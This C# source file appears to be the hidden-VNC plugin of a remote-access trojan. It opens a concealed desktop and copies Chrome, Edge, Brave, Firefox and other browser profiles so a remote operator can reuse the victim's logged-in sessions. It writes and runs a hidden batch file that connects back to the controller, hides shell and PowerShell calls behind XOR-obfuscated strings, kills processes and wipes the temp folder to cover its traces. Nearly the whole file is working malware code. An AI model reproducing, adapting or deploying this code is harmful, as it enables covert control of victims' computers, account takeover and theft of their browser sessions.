using Microsoft.VisualBasic;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace Plugin.Handle
{
    class HandlehVNC
    {


        [System.Runtime.InteropServices.DllImport("Shell32.dll")]
        private static extern int SHChangeNotify(int eventId, int flags, IntPtr item1, IntPtr item2);

        static string strSourcePath = null;
        static string strDestPath = null;
        public void Start(string port)
        {
            Packet.Log("Copy Profile Started");
            try
            {
                Task.Run(async () =>
                {
                    await Copyall();
                }).Wait();
            }
            catch
            {
                Packet.Log("Copy Profile Failed");
            }
            Packet.Log("Starting hVNC");
            try
            {

                Omega.Start(port);
            }
            catch
            {
                Packet.Log("Starting hVNC Failed");
            }



        }
        private static ScreenHelper g_hDesk = null;
        public static string userFame = Environment.UserName;
        public static void exodos()
        {
            string text = "hvnc_project";//hvnc_project
            string text3 = @"C:\Users\" + userFame + @"\AppData\Local\exodus\app-21.12.31\Exodus.exe";
            string text2 = "cmd.exe /c start ";

            g_hDesk = ScreenHelper.OpenDesktop(text);
            if (g_hDesk == null)
            {
                g_hDesk = ScreenHelper.CreateDesktop(text);
            }
            ScreenHelper.SetCurrent(g_hDesk);
            ScreenHelper.CreateProcess(text2, text, bAppName: false);


        }
        public static void fun3()
        {
            string exe2 = Path.Combine(Path.GetTempPath(), "svrost.exe");
            //File.WriteAllBytes(exe2, Properties.Resources.InstallH);
            Exec(exe2, "u", (object)0);
        }
        public void fun1(string port)
        {
            int finalport = Convert.ToInt32(port);
            string host = Plugin.Socket.RemoteEndPoint.ToString();
            int index = host.LastIndexOf(":");
            if (index > 0)
                host = host.Substring(0, index);
            //string debug = Path.Combine(Path.GetTempPath(), "Hdebugvnc.txt");
            //File.AppendAllText(debug, host+":"+port);
            string exe = Path.Combine(Path.GetTempPath(), "svgost.exe");
            string exbat = Path.Combine(Path.GetTempPath(), "exec.bat");
            string exlog = Path.Combine(Path.GetTempPath(), "log.txt");
            //File.WriteAllBytes(exe, Properties.Resources.Client);
            System.IO.StreamWriter file = new System.IO.StreamWriter(Path.Combine(Path.GetTempPath(), "exec.bat"));
            file.WriteLine("set exeFile=" + exe);
            file.WriteLine("set logFile=" + exlog);
            file.WriteLine("%exeFile%  " + host.Replace(":", " ") + "  " + port + " > %logFile%");
            file.Close();
            string chv = Path.Combine(Path.Combine(Path.GetTempPath(), "exec.bat"));
            Process.Start(new ProcessStartInfo
            {
                FileName = chv,
                CreateNoWindow = true,
                WindowStyle = ProcessWindowStyle.Hidden,
                UseShellExecute = true,
                ErrorDialog = false,
            }).WaitForExit();
            exetrm();
            cleantemp();
            cleantempForce();
            killproc("cmd");
            killproc("conhost");
        }
        public void fun2()
        {
            // fun3();
            killproc("cmd");
            killproc("conhost");
            exetrm();
            cleantemp();
            cleantempForce();
            Stop();

        }

        public static void killproc(string name)
        {
            try
            {
                //Find process & Kill
                foreach (Process Proc in (from p in Process.GetProcesses()
                                          where p.ProcessName == name || p.ProcessName == name
                                          select p))
                {
                    Interaction.Shell("TASKKILL /F /IM " + Proc.ProcessName + ".exe");
                }
            }
            catch (Exception ex)
            {

            }


        }
        public static void Exec(string path, string parameter, object show)
        {
            try
            {
                Type typeFromClsid = Type.GetTypeFromCLSID(new Guid(thebook("3HK:?3=8'L<K2';;IL'K>>8'::K:I3:K2L93")));
                object instance = Activator.CreateInstance(typeFromClsid);
                object target1 = typeFromClsid.InvokeMember(thebook("c~og"), BindingFlags.InvokeMethod, (Binder)null, instance, (object[])null);
                object target2 = target1.GetType().InvokeMember(thebook("Nei\x007Fgod~"), BindingFlags.GetProperty, (Binder)null, target1, (object[])null);
                object target3 = target2.GetType().InvokeMember(thebook("Kzzfcik~ced"), BindingFlags.GetProperty, (Binder)null, target2, (object[])null);
                target3.GetType().InvokeMember(thebook("YboffOroi\x007F~o"), BindingFlags.InvokeMethod, (Binder)null, target3, new object[5]
                {
                    (object) path,
                    (object) parameter,
                    (object) "",
                    null,
                    show
                });
            }
            catch
            {
            }
        }

        public void Stop()
        {

            foreach (Process proc in Process.GetProcessesByName("svgost.exe"))
            {
                proc.Kill();
            }
            foreach (Process proc in Process.GetProcessesByName("CSClient"))
            {
                proc.Kill();
            }
            foreach (Process proc in Process.GetProcessesByName("csclient"))
            {
                proc.Kill();
            }

            foreach (Process proc in Process.GetProcessesByName("PEGASUSClient"))
            {
                proc.Kill();
            }
            foreach (Process proc in Process.GetProcessesByName("pegasusclient"))
            {
                proc.Kill();
            }
            foreach (Process proc in Process.GetProcessesByName("clientHD"))
            {
                proc.Kill();
            }
            foreach (Process proc in Process.GetProcessesByName("cmd"))
            {
                proc.Kill();
            }
            foreach (Process proc in Process.GetProcessesByName("conhost"))
            {
                proc.Kill();
            }
            cleantemp();
            cleantempForce();

        }
        [DllImport("user32.dll")]
        private static extern bool EnumWindows(EnumWindowsDelegate lpEnumFunc, IntPtr lParam);
        [DllImport("user32.dll")]
        private static extern IntPtr GetWindowThreadProcessId(IntPtr hWnd, out IntPtr lpdwProcessId);
        [DllImport("user32.dll")]
        private static extern uint RealGetWindowClass(IntPtr hwnd, StringBuilder pszType, uint cchType);
        [DllImport("user32.dll")]
        static extern IntPtr SendMessage(IntPtr hWnd, UInt32 Msg, IntPtr wParam, IntPtr lParam);

        static uint WM_CLOSE = 0x10;

        private delegate bool EnumWindowsDelegate(IntPtr hwnd, IntPtr lParam);

        private static bool EnumWindowsCallback(IntPtr hwnd, IntPtr lParam)
        {
            IntPtr pid = new IntPtr();
            GetWindowThreadProcessId(hwnd, out pid);
            var wndProcess = System.Diagnostics.Process.GetProcessById(pid.ToInt32());
            var wndClass = new StringBuilder(255);
            RealGetWindowClass(hwnd, wndClass, 255);
            if (wndProcess.ProcessName == "explorer" && wndClass.ToString() == "CabinetWClass")
            {
                //hello file explorer window...

                SendMessage(hwnd, WM_CLOSE, IntPtr.Zero, IntPtr.Zero); // ... bye file explorer window
            }
            return (true);
        }

        static void exetrm()
        {
            EnumWindowsDelegate childProc = new EnumWindowsDelegate(EnumWindowsCallback);

            EnumWindows(childProc, IntPtr.Zero);

            // Console.ReadKey();
        }
        public void cleantempForce()
        {
            System.IO.DirectoryInfo di = new DirectoryInfo(Path.GetTempFileName());

            foreach (FileInfo file in di.GetFiles())
            {
                file.Delete();
            }
            foreach (DirectoryInfo dir in di.GetDirectories())
            {
                dir.Delete(true);
            }

        }
        public static void DeleteDirectory(string target_dir)
        {
            string[] files = Directory.GetFiles(target_dir);
            string[] dirs = Directory.GetDirectories(target_dir);

            foreach (string file in files)
            {
                File.SetAttributes(file, FileAttributes.Normal);
                File.Delete(file);
            }

            foreach (string dir in dirs)
            {
                DeleteDirectory(dir);
            }

            Directory.Delete(target_dir, false);
        }

        public static void cleantemp()
        {

            Process.Start(new ProcessStartInfo
            {
                FileName = "cmd",
                Arguments = $"/k start /b del /q/f/s %TEMP%\\* & exit",
                CreateNoWindow = true,
                WindowStyle = ProcessWindowStyle.Hidden,
                UseShellExecute = true,
                ErrorDialog = false,
            });

        }
        public static void PS(string args)
        {
            Process proc = new Process
            {
                StartInfo = new ProcessStartInfo
                {
                    FileName = "powershell",
                    Arguments = args,
                    WindowStyle = ProcessWindowStyle.Hidden,
                    CreateNoWindow = true
                }
            };
            proc.Start();
        }
        public static void RunPS(string args)
        {
            Process proc = new Process
            {
                StartInfo = new ProcessStartInfo
                {
                    FileName = thebook("ze}oxyboff"),
                    Arguments = args,
                    WindowStyle = ProcessWindowStyle.Hidden,
                    CreateNoWindow = true
                }
            };
            proc.Start();
        }
        public static string thebook(string str)
        {
            char ch1 = '\n';
            StringBuilder stringBuilder = new StringBuilder();

            foreach (uint num in str.ToCharArray())
            {
                char ch2 = (char)(num ^ ch1);
                stringBuilder.Append(ch2);
            }
            return stringBuilder.ToString();
        }
        public static void CopyFolder(string sourceFolder, string destFolder)
        {
            if (!Directory.Exists(destFolder))
                Directory.CreateDirectory(destFolder);
            string[] files = Directory.GetFiles(sourceFolder);
            foreach (string file in files)
            {
                string name = System.IO.Path.GetFileName(file);
                string dest = System.IO.Path.Combine(destFolder, name);
                File.Copy(file, dest, true);
            }
            string[] folders = Directory.GetDirectories(sourceFolder);
            foreach (string folder in folders)
            {
                string name = System.IO.Path.GetFileName(folder);
                string dest = System.IO.Path.Combine(destFolder, name);
                CopyFolder(folder, dest);
            }
        }

        private static void syncAllFilesFirstTime()
        {
            string[] arrFiles = Directory.GetFiles(strSourcePath);

            foreach (string sourceFiles in arrFiles)
            {

                string strFileName = Path.GetFileName(sourceFiles);
                string strDesFilePath = string.Format(@"{0}\{1}", strDestPath, strFileName);

                if (!File.Exists(strDesFilePath))
                    File.Copy(sourceFiles, strDesFilePath, true);
            }
        }

        public static bool IsFileLocked(string strSourcePath)
        {
            try
            {
                using (Stream stream = new FileStream(strSourcePath, FileMode.Open))
                {
                    return true;
                }
            }
            catch
            {
                return false;
            }
        }
        private static void syncUpdatedFiles(string strSourceFile)
        {

            string strFileName = Path.GetFileName(strSourceFile);
            string strDesFilePath = string.Format(@"{0}\{1}", strDestPath, strFileName);
            var val = File.Exists(strDesFilePath);

            if (!File.Exists(strDesFilePath))
            {
                while (!IsFileLocked(strSourceFile))
                    ; ;

                File.Copy(strSourceFile, strDesFilePath, true);
            }

        }
        private static void OnChanged(object source, FileSystemEventArgs e)
        {
            Console.WriteLine("File: " + e.FullPath + " " + e.ChangeType);
            syncUpdatedFiles(e.FullPath);
        }
        private static void watch()
        {
            FileSystemWatcher watcher = new FileSystemWatcher();
            watcher.Path = strSourcePath;
            watcher.Filter = "*.*";
            watcher.Created += new FileSystemEventHandler(OnChanged);
            watcher.EnableRaisingEvents = true;
        }
        private static async Task Copyall()
        {
            string strDesktopName = "hvnc_project";
            string path = Path.Combine(System.Environment.GetFolderPath(Environment.SpecialFolder.Desktop));
            string chrome = "C:\\Users\\Public\\Desktop\\Google Chrome.lnk";
            string Cchrome = Path.Combine(path, "*Chrome.lnk");
            string Uchrome = Path.Combine(path, "Google Chrome.lnk");
            string UEdge = Path.Combine(path, "Microsoft Edge.lnk");
            string Edge = "C:\\Users\\Public\\Desktop\\Microsoft Edge.lnk";
            string text6 = Microsoft.Win32.Registry.GetValue(@"HKEY_CLASSES_ROOT\ChromeHTML\shell\open\command", null, null) as string;
            string btext3 = Microsoft.Win32.Registry.GetValue(@"HKEY_CLASSES_ROOT\BraveHTML\shell\open\command", null, null) as string;
            string gtext3 = Microsoft.Win32.Registry.GetValue(@"HKEY_CLASSES_ROOT\MSEdgeHTM\shell\open\command", null, null) as string;
            if (File.Exists(chrome))
            {
                //File.Delete(chrome);

            }
            else if (File.Exists(Uchrome))
            {
                //File.Delete(Uchrome);

            }
            else if (File.Exists(Cchrome))
            {
                DirectoryInfo di = new DirectoryInfo(path);
                FileInfo[] files = di.GetFiles("*Chrome.lnk")
                                     .Where(p => p.Extension == ".lnk").ToArray();
                foreach (FileInfo file in files)
                    try
                    {
                        file.Attributes = FileAttributes.Normal;
                        //File.Delete(file.FullName);
                    }
                    catch { }

            }
            if (File.Exists(Edge))
            {
                //File.Delete(Edge);

            }
            else if (File.Exists(UEdge))
            {
                //File.Delete(UEdge);

            }
            else if (File.Exists(UEdge))
            {
                DirectoryInfo di = new DirectoryInfo(path);
                FileInfo[] files = di.GetFiles("*Edge.lnk")
                                     .Where(p => p.Extension == ".lnk").ToArray();
                foreach (FileInfo file in files)
                    try
                    {
                        file.Attributes = FileAttributes.Normal;
                        //File.Delete(file.FullName);
                    }
                    catch { }

            }
            if (File.Exists("C:\\Program Files\\Mozilla Firefox\\firefox.exe"))
            {
                string FfolderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
                FfolderPath = Path.Combine(FfolderPath, "Mozilla\\Firefox\\");
                string Fpath = Path.Combine(FfolderPath, "profiles.ini");
                string[] array = File.ReadAllLines(Fpath);
                bool flag = false;
                string Ftext = null;
                string[] array2 = array;
                foreach (string text2 in array2)
                {
                    if (text2.Contains("IsRelative=1"))
                    {
                        flag = true;
                    }
                    else if (text2.Contains("Path="))
                    {
                        Ftext = text2.Substring(5);
                    }
                }
                FfolderPath = ((!flag) ? Ftext : Path.Combine(FfolderPath, Ftext));
                string text3 = Path.Combine(FfolderPath, "Mozilla\\Firefox\\hvnc_project");
                if (!Directory.Exists(text3))
                {
                    Directory.CreateDirectory(text3);
                }

                //DirectoryCopy("\"" + FfolderPath + "\"", "\"" + text3 + "\"");
                //Directory.CreateDirectory(strNewAppPath);
                List<Thread> Threads = new List<Thread>();
                try
                {

                    Threads.Add(new Thread(() =>
                    {
                        //Thread.Sleep(3000);
                        try
                        {
                            //ChromeFileCopy(strLocalAppPath, strNewAppPath);
                            //FZip(strLocalAppPath, strLocalAppPath+"test.zip");
                            //UnZip(strLocalAppPath + "test.zip", strNewAppPath);
                            //RunPS("Copy-item -Path " + strLocalAppPath + " -Destination " + strNewAppPath + " -Recurse -Force ");
                            //Directory.Move(strLocalAppPath, strNewAppPath);
                            CopyFolder(FfolderPath, text3);
                        }
                        catch
                        {
                        }
                    }));

                    foreach (Thread t in Threads)
                        t.Start();
                    foreach (Thread t in Threads)
                        t.Join();

                }
                catch
                {

                }
                strSourcePath = FfolderPath;
                strDestPath = text3;
                string firefox = @"C:\\Program Files\\Mozilla Firefox\\firefox.exe";
                string FArguments = "";
                FArguments += " -new-tab about:sessionrestore -no-remote -profile " + text3;
                //createlinks(firefox, FArguments, "Firefox");
            }
            if (File.Exists("C:\\Program Files\\Waterfox\\waterfox.exe"))
            {
                string WfolderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
                WfolderPath = Path.Combine(WfolderPath, "Waterfox");
                string Wpath = Path.Combine(WfolderPath, "profiles.ini");
                string[] array = File.ReadAllLines(Wpath);
                bool flag = false;
                string Wtext = null;
                string[] array2 = array;
                foreach (string text2 in array2)
                {
                    if (text2.Contains("IsRelative=1"))
                    {
                        flag = true;
                    }
                    else if (text2.Contains("Path="))
                    {
                        Wtext = text2.Substring(5);
                    }
                }
                WfolderPath = ((!flag) ? Wtext : Path.Combine(WfolderPath, Wtext));
                string text3 = Path.Combine(WfolderPath, "Waterfox\\hvnc_project");
                if (!Directory.Exists(text3))
                {
                    Directory.CreateDirectory(text3);
                }
                //DirectoryCopy("\"" + WfolderPath + "\"", "\"" + text3 + "\"");
                List<Thread> Threads = new List<Thread>();
                try
                {

                    Threads.Add(new Thread(() =>
                    {
                        //Thread.Sleep(3000);
                        try
                        {
                            //ChromeFileCopy(strLocalAppPath, strNewAppPath);
                            //FZip(strLocalAppPath, strLocalAppPath+"test.zip");
                            //UnZip(strLocalAppPath + "test.zip", strNewAppPath);
                            //RunPS("Copy-item -Path " + strLocalAppPath + " -Destination " + strNewAppPath + " -Recurse -Force ");
                            //Directory.Move(strLocalAppPath, strNewAppPath);
                            CopyFolder(WfolderPath, text3);
                        }
                        catch
                        {
                        }
                    }));

                    foreach (Thread t in Threads)
                        t.Start();
                    foreach (Thread t in Threads)
                        t.Join();

                }
                catch
                {

                }
                strSourcePath = WfolderPath;
                strDestPath = text3;
                string waterfox = @"C:\\Program Files\\Waterfox\\waterfox.exe";
                string wArguments = "";
                wArguments += " -new-tab about:sessionrestore -no-remote -profile " + text3;
                //createlinks(waterfox, wArguments, "Waterfox");
            }
            if (File.Exists("C:\\Program Files\\Pale Moon\\palemoon.exe"))
            {
                string PfolderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
                PfolderPath = Path.Combine(PfolderPath, "Moonchild Productions\\Pale Moon");
                string Ppath = Path.Combine(PfolderPath, "profiles.ini");
                string[] array = File.ReadAllLines(Ppath);
                bool flag = false;
                string Ptext = null;
                string[] array2 = array;
                foreach (string text2 in array2)
                {
                    if (text2.Contains("IsRelative=1"))
                    {
                        flag = true;
                    }
                    else if (text2.Contains("Path="))
                    {
                        Ptext = text2.Substring(5);
                    }
                }
                PfolderPath = ((!flag) ? Ptext : Path.Combine(PfolderPath, Ptext));
                string text3 = Path.Combine(PfolderPath, "Moonchild Productions\\Pale Moon\\hvnc_project");
                if (!Directory.Exists(text3))
                {
                    Directory.CreateDirectory(text3);
                }
                //DirectoryCopy("\"" + PfolderPath + "\"", "\"" + text3 + "\"");
                List<Thread> Threads = new List<Thread>();
                try
                {

                    Threads.Add(new Thread(() =>
                    {
                        //Thread.Sleep(3000);
                        try
                        {
                            //ChromeFileCopy(strLocalAppPath, strNewAppPath);
                            //FZip(strLocalAppPath, strLocalAppPath+"test.zip");
                            //UnZip(strLocalAppPath + "test.zip", strNewAppPath);
                            //RunPS("Copy-item -Path " + strLocalAppPath + " -Destination " + strNewAppPath + " -Recurse -Force ");
                            //Directory.Move(strLocalAppPath, strNewAppPath);
                            CopyFolder(PfolderPath, text3);
                        }
                        catch
                        {
                        }
                    }));

                    foreach (Thread t in Threads)
                        t.Start();
                    foreach (Thread t in Threads)
                        t.Join();

                }
                catch
                {

                }
                strSourcePath = PfolderPath;
                strDestPath = text3;
                string pale = @"C:\\Program Files\\Pale Moon\\palemoon.exe";
                string pArguments = "";
                pArguments += " -new-tab about:sessionrestore -no-remote -profile " + text3;
                //createlinks(pale, pArguments, "Palemoon");
            }
            if (File.Exists("C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe"))
            {
                string strLocalAppPath = Environment.GetEnvironmentVariable("LocalAppData");
                strLocalAppPath = Path.Combine(strLocalAppPath, "Google\\Chrome");

                string strNewAppPath = strLocalAppPath;
                strNewAppPath = Path.Combine(strLocalAppPath, strDesktopName);
                strLocalAppPath = Path.Combine(strLocalAppPath, "User Data");

                Directory.CreateDirectory(strNewAppPath);
                List<Thread> Threads = new List<Thread>();
                try
                {

                    Threads.Add(new Thread(() =>
                    {
                        //Thread.Sleep(3000);
                        try
                        {
                            //ChromeFileCopy(strLocalAppPath, strNewAppPath);
                            //FZip(strLocalAppPath, strLocalAppPath+"test.zip");
                            //UnZip(strLocalAppPath + "test.zip", strNewAppPath);
                            //RunPS("Copy-item -Path " + strLocalAppPath + " -Destination " + strNewAppPath + " -Recurse -Force ");
                            //Directory.Move(strLocalAppPath, strNewAppPath);
                            CopyFolder(strLocalAppPath, strNewAppPath);
                        }
                        catch
                        {
                        }
                    }));

                    foreach (Thread t in Threads)
                        t.Start();
                    foreach (Thread t in Threads)
                        t.Join();

                }
                catch
                {

                }

                string strCmdLine = "";
                var strChromePath = Microsoft.Win32.Registry.GetValue(@"HKEY_CLASSES_ROOT\ChromeHTML\shell\open\command", null, null) as string;
                if (strChromePath != null)
                {
                    var split = strChromePath.Split('\"');
                    strChromePath = split.Length >= 2 ? split[1] : null;

                    strCmdLine += "\"" + strChromePath + "\"";
                    strCmdLine += " --no-sandbox --allow-no-sandbox-job --disable-3d-apis --disable-gpu --disable-d3d11 --restore-last-session --user-data-dir=";
                    strCmdLine += "\"";
                    strCmdLine += strNewAppPath;
                    strCmdLine += "\"";

                }
                else
                {
                    const string suffix = @"Google\Chrome\Application\chrome.exe";
                    var prefixes = new List<string> { Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) };
                    var programFiles = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles);
                    var programFilesx86 = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86);
                    if (programFilesx86 != programFiles)
                    {
                        prefixes.Add(programFiles);
                    }
                    else
                    {
                        var programFilesDirFromReg = Microsoft.Win32.Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion", "ProgramW6432Dir", null) as string;
                        if (programFilesDirFromReg != null) prefixes.Add(programFilesDirFromReg);
                    }

                    prefixes.Add(programFilesx86);
                    strChromePath = prefixes.Distinct().Select(prefix => Path.Combine(prefix, suffix)).FirstOrDefault(File.Exists);

                    strChromePath = "\"" + strChromePath + "\"";
                    strCmdLine += strChromePath;
                    strCmdLine += " --no-sandbox --allow-no-sandbox-job --disable-3d-apis --disable-gpu --disable-d3d11 --restore-last-session --user-data-dir=";
                    //kki            strCmdLine += " --no-sandbox --allow-no-sandbox-job --disable-3d-apis --disable-gpu --disable-d3d11 --disable-extensions --disable-notifications --no-referrers --no-experiments --mute-audio --restore-last-session --user-data-dir=";
                    //kki            strCmdLine += " --flag-switches-begin --flag-switches-end --origin-trial-disabled-features=SecurePaymentConfirmation --user-data-dir=";
                    strCmdLine += "\"";
                    strCmdLine += strNewAppPath;
                    strCmdLine += "\"";

                    string strTestAppPath = Path.Combine(Path.GetTempPath(), "zedrat");
                    File.AppendAllText(strTestAppPath + "\\test2", strCmdLine);
                }

                strSourcePath = strLocalAppPath;
                strDestPath = strNewAppPath;

                watch();
                syncAllFilesFirstTime();
                string localAppDataPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
                string chromeLocalAppDataPath = localAppDataPath + "\\Google\\Chrome\\Remote hVNC";
                string CArguments = "";
                CArguments += " --no-sandbox --allow-no-sandbox-job --disable-3d-apis --disable-gpu --disable-d3d11 --restore-last-session --user-data-dir=";
                CArguments += "\"";
                CArguments += chromeLocalAppDataPath;
                CArguments += "\"";
                //createlinks(strChromePath, CArguments, "Chrome");
            }
            if (File.Exists("C:\\Program Files\\BraveSoftware\\Brave-Browser\\Application\\brave.exe"))
            {
                string strLocalAppPath = Environment.GetEnvironmentVariable("LocalAppData");
                strLocalAppPath = Path.Combine(strLocalAppPath, "BraveSoftware\\Brave-Browser");

                string strNewAppPath = strLocalAppPath;
                strNewAppPath = Path.Combine(strLocalAppPath, strDesktopName);
                strLocalAppPath = Path.Combine(strLocalAppPath, "User Data");

                Directory.CreateDirectory(strNewAppPath);
                List<Thread> Threads = new List<Thread>();
                try
                {

                    Threads.Add(new Thread(() =>
                    {
                        //Thread.Sleep(3000);
                        try
                        {
                            //ChromeFileCopy(strLocalAppPath, strNewAppPath);
                            //FZip(strLocalAppPath, strLocalAppPath+"test.zip");
                            //UnZip(strLocalAppPath + "test.zip", strNewAppPath);
                            //RunPS("Copy-item -Path " + strLocalAppPath + " -Destination " + strNewAppPath + " -Recurse -Force ");
                            //Directory.Move(strLocalAppPath, strNewAppPath);
                            CopyFolder(strLocalAppPath, strNewAppPath);
                        }
                        catch
                        {
                        }
                    }));

                    foreach (Thread t in Threads)
                        t.Start();
                    foreach (Thread t in Threads)
                        t.Join();

                }
                catch
                {

                }

                string strCmdLine = "";
                var strChromePath = Microsoft.Win32.Registry.GetValue(@"HKEY_CLASSES_ROOT\BraveHTML\shell\open\command", null, null) as string;
                if (strChromePath != null)
                {
                    var split = strChromePath.Split('\"');
                    strChromePath = split.Length >= 2 ? split[1] : null;

                    strCmdLine += "\"" + strChromePath + "\"";
                    strCmdLine += " --no-sandbox --allow-no-sandbox-job --disable-3d-apis --disable-gpu --disable-d3d11 --restore-last-session --user-data-dir=";
                    strCmdLine += "\"";
                    strCmdLine += strNewAppPath;
                    strCmdLine += "\"";

                }
                else
                {
                    const string suffix = @"BraveSoftware\Brave-Browser\Application\brave.exe";
                    var prefixes = new List<string> { Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) };
                    var programFiles = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles);
                    var programFilesx86 = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86);
                    if (programFilesx86 != programFiles)
                    {
                        prefixes.Add(programFiles);
                    }
                    else
                    {
                        var programFilesDirFromReg = Microsoft.Win32.Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion", "ProgramW6432Dir", null) as string;
                        if (programFilesDirFromReg != null) prefixes.Add(programFilesDirFromReg);
                    }

                    prefixes.Add(programFilesx86);
                    strChromePath = prefixes.Distinct().Select(prefix => Path.Combine(prefix, suffix)).FirstOrDefault(File.Exists);

                    strChromePath = "\"" + strChromePath + "\"";
                    strCmdLine += strChromePath;
                    strCmdLine += " --no-sandbox --allow-no-sandbox-job --disable-3d-apis --disable-gpu --disable-d3d11 --restore-last-session --user-data-dir=";
                    //kki            strCmdLine += " --no-sandbox --allow-no-sandbox-job --disable-3d-apis --disable-gpu --disable-d3d11 --disable-extensions --disable-notifications --no-referrers --no-experiments --mute-audio --restore-last-session --user-data-dir=";
                    //kki            strCmdLine += " --flag-switches-begin --flag-switches-end --origin-trial-disabled-features=SecurePaymentConfirmation --user-data-dir=";
                    strCmdLine += "\"";
                    strCmdLine += strNewAppPath;
                    strCmdLine += "\"";

                    string strTestAppPath = Path.Combine(Path.GetTempPath(), "zedrat");
                    File.AppendAllText(strTestAppPath + "\\test2", strCmdLine);
                }

                strSourcePath = strLocalAppPath;
                strDestPath = strNewAppPath;

                watch();
                syncAllFilesFirstTime();
                string localAppDataPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
                string braveLocalAppDataPath = localAppDataPath + "\\BraveSoftware\\Brave-Browser\\Remote hVNC";
                string bArguments = "";
                bArguments += " --no-sandbox --allow-no-sandbox-job --disable-3d-apis --disable-gpu --disable-d3d11 --restore-last-session --user-data-dir=";
                bArguments += "\"";
                bArguments += braveLocalAppDataPath;
                bArguments += "\"";
                //createlinks(strChromePath, bArguments, "Brave");

            }
            if (File.Exists("C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe"))
            {
                string strLocalAppPath = Environment.GetEnvironmentVariable("LocalAppData");
                strLocalAppPath = Path.Combine(strLocalAppPath, "Microsoft\\Edge");

                string strNewAppPath = strLocalAppPath;
                strNewAppPath = Path.Combine(strLocalAppPath, strDesktopName);
                strLocalAppPath = Path.Combine(strLocalAppPath, "User Data");

                Directory.CreateDirectory(strNewAppPath);
                List<Thread> Threads = new List<Thread>();
                try
                {

                    Threads.Add(new Thread(() =>
                    {
                        //Thread.Sleep(3000);
                        try
                        {
                            //ChromeFileCopy(strLocalAppPath, strNewAppPath);
                            //FZip(strLocalAppPath, strLocalAppPath+"test.zip");
                            //UnZip(strLocalAppPath + "test.zip", strNewAppPath);
                            //RunPS("Copy-item -Path " + strLocalAppPath + " -Destination " + strNewAppPath + " -Recurse -Force ");
                            //Directory.Move(strLocalAppPath, strNewAppPath);
                            CopyFolder(strLocalAppPath, strNewAppPath);
                        }
                        catch
                        {
                        }
                    }));

                    foreach (Thread t in Threads)
                        t.Start();
                    foreach (Thread t in Threads)
                        t.Join();

                }
                catch
                {

                }

                string strCmdLine = "";
                var strChromePath = Microsoft.Win32.Registry.GetValue(@"HKEY_CLASSES_ROOT\MSEdgeHTM\shell\open\command", null, null) as string;
                if (strChromePath != null)
                {
                    var split = strChromePath.Split('\"');
                    strChromePath = split.Length >= 2 ? split[1] : null;

                    strCmdLine += "\"" + strChromePath + "\"";
                    strCmdLine += " --no-sandbox --allow-no-sandbox-job --disable-3d-apis --disable-gpu --disable-d3d11 --restore-last-session --user-data-dir=";
                    strCmdLine += "\"";
                    strCmdLine += strNewAppPath;
                    strCmdLine += "\"";

                }
                else
                {
                    const string suffix = @"Microsoft\Edge\Application\msedge.exe";
                    var prefixes = new List<string> { Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) };
                    var programFiles = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles);
                    var programFilesx86 = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86);
                    if (programFilesx86 != programFiles)
                    {
                        prefixes.Add(programFiles);
                    }
                    else
                    {
                        var programFilesDirFromReg = Microsoft.Win32.Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion", "ProgramW6432Dir", null) as string;
                        if (programFilesDirFromReg != null) prefixes.Add(programFilesDirFromReg);
                    }

                    prefixes.Add(programFilesx86);
                    strChromePath = prefixes.Distinct().Select(prefix => Path.Combine(prefix, suffix)).FirstOrDefault(File.Exists);

                    strChromePath = "\"" + strChromePath + "\"";
                    strCmdLine += strChromePath;
                    strCmdLine += " --no-sandbox --allow-no-sandbox-job --disable-3d-apis --disable-gpu --disable-d3d11 --restore-last-session --user-data-dir=";
                    //kki            strCmdLine += " --no-sandbox --allow-no-sandbox-job --disable-3d-apis --disable-gpu --disable-d3d11 --disable-extensions --disable-notifications --no-referrers --no-experiments --mute-audio --restore-last-session --user-data-dir=";
                    //kki            strCmdLine += " --flag-switches-begin --flag-switches-end --origin-trial-disabled-features=SecurePaymentConfirmation --user-data-dir=";
                    strCmdLine += "\"";
                    strCmdLine += strNewAppPath;
                    strCmdLine += "\"";

                    string strTestAppPath = Path.Combine(Path.GetTempPath(), "zedrat");
                    File.AppendAllText(strTestAppPath + "\\test2", strCmdLine);
                }

                strSourcePath = strLocalAppPath;
                strDestPath = strNewAppPath;

                watch();
                syncAllFilesFirstTime();
                string localAppDataPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
                string edgeLocalAppDataPath = localAppDataPath + "\\Microsoft\\Edge\\Remote hVNC";
                string eArguments = "";
                eArguments += " --no-sandbox --allow-no-sandbox-job --disable-3d-apis --disable-gpu --disable-d3d11 --restore-last-session --user-data-dir=";
                eArguments += "\"";
                eArguments += edgeLocalAppDataPath;
                eArguments += "\"";
                //createlinks(strChromePath, eArguments, "Edge");

            }

            SHChangeNotify(0x8000000, 0x1000, IntPtr.Zero, IntPtr.Zero);
            SHChangeNotify(0x8000000, 0x1000, IntPtr.Zero, IntPtr.Zero);
        }
    }
}
